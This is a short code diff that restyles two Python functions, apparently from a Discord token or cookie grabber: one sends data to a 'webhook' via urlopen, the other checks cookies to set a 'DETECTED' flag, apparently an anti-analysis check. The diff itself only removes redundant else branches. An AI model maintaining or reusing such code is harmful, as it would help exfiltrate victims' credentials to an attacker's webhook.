@@ -130,10 +130,9 @@ def LoadUrlib(webhook, data="", files="", headers=""):
         r = urlopen(Request(webhook, data=data, headers=headers))
         print(r)
         return r
-    else:
-        r = urlopen(Request(webhook, data=data))
-        print(r)
-        return r
+    r = urlopen(Request(webhook, data=data))
+    print(r)
+    return r
 
 
 def Trust(Cookies):
@@ -144,9 +143,8 @@ def Trust(Cookies):
     if len(tim) < 1:
         DETECTED = True
         return DETECTED
-    else:
-        DETECTED = False
-        return DETECTED
+    DETECTED = False
+    return DETECTED
 
 dclass = discordc.DiscordX()
 
